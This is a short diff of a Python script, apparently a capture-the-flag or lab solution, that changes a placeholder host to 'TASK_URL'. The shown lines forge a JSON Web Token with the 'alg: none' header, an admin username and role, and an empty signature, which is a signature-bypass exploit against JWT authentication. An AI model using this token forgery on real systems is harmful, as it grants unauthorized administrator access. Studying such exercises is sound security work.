@@ -5,7 +5,7 @@ import requests
 import pyperclip
 import html
 
-HOST = 'http://HOST'
+HOST = 'http://TASK_URL'
 JWT_HEADER = base64.urlsafe_b64encode('{"alg":"none","typ":"JWT"}'.encode()).replace(b'=', b'')
 JWT_PAYLOAD = base64.urlsafe_b64encode('{"username":"admin","role":"admin","exp":1000000}'.encode()).replace(b'=', b'')
 TOKEN = JWT_HEADER + b'.' + JWT_PAYLOAD + b'.'
